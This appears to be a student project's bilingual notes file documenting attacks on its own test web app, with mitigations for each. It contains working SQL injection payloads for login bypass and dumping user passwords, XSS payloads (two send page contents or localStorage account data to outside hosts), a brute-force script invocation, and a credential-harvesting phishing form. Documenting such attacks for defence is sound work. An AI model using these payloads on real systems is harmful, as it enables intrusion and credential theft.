# SQL Injections
Kann momentan beispielsweise durchgeführt werden, folgendes 
__" OR 1 = 1 #__ in das login-Username feld eingetragen wird. Hierdurch kann man sich einloggen ohne credentials zu nutzen.

### Union Attack 
Query kann herausgefunden werden, indem man __%'__ in das suchfeld postet oder __"__ in das login-feld.
__%' ORDER BY 4--__ to find out how many columns are in the table since this is important for the attack.
__%' UNION SELECT NULL, username, passw, NULL, NULL FROM Users --__ to return userdata.

## Maßnahmen
Escaping query values:
https://github.com/mysqljs/mysql#escaping-query-values (Placeholders: https://mariadb.com/kb/en/connector-nodejs-promise-api/)


# Cross-Site Scripting
Reflected XSS
Insert <script>alert();</script>
https://www.imperva.com/learn/application-security/reflected-xss-attacks/#:~:text=Reflected%20XSS%20attacks%2C%20also%20known,enables%20execution%20of%20malicious%20scripts.
https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
```js
<script>alert(document.cookie); </script>
<img src="http://url.to.file.which/not.exist" onerror= window.open("https://www.google.com");>
<img src="http://url.to.file.which/not.exist" onerror= alert();>
<IMG SRC=j&#X41vascript:alert('test2')>
<script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>
<img 
  src="https://jnx.me/img/profile.jpg" 
  style="display:none" 
  onload="fetch('https://enj917gkdfyp.x.pipedream.net/', {method: 'POST', body: localStorage.getItem('account')})"
>
```

## Maßnahmen
https://v2.vuejs.org/v2/guide/security.html#:~:text=The%20most%20fundamental%20security%20rule%20when%20using%20Vue,during%20server-side%20rendering.%20An%20example%20of%20such%20usage%3A

https://www.npmjs.com/package/sanitize-html

# Brute-force attack
Is possible because we do not check how many requests have been sent by one user

To start the brute-force script navigate to the "Attacks" directory and preform the following command:

```
python -m pip install selenium
python brute-force.py -u admin -t http://localhost:8081/loginPage -p passwords.txt
```

# Broken Encryption
Möglich wegen veraltetem Hashalgorythmus (SHA256) und weil kein Salt verwendet wird sind alle hashes deterministisch 

# HTML Injections
(Phishing)
```html
<h3>Please login to proceed</h3>
<form action=http://www.google.com>
Username:<br>
<input type="username" name="username"></br>
Password:<br>
<input type="password" name="password"></br>
<br>
<input type="submit" value="Login"></br>
```

## Maßnahmen
https://www.npmjs.com/package/sanitize-html
